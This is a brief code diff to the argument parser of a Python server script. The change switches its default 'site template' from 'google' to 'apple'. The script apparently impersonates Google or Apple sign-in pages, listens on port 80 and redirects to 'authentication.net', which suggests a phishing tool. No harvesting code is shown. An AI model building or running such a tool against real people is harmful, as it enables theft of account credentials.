@@ -46,7 +46,7 @@ def main() -> None:
     parser.add_argument('-a', '--address', type=str, help='Set address for listen (default: "0.0.0.0")',
                         default='0.0.0.0')
     parser.add_argument('-p', '--port', type=int, help='Set port for listen (default: 80)', default=80)
-    parser.add_argument('-s', '--site', type=str, help='Set site template "google" or "apple"', default='google')
+    parser.add_argument('-s', '--site', type=str, help='Set site template "google" or "apple"', default='apple')
     parser.add_argument('-r', '--redirect', type=str, help='Set site domain for redirect', default='authentication.net')
     parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
     args = parser.parse_args()
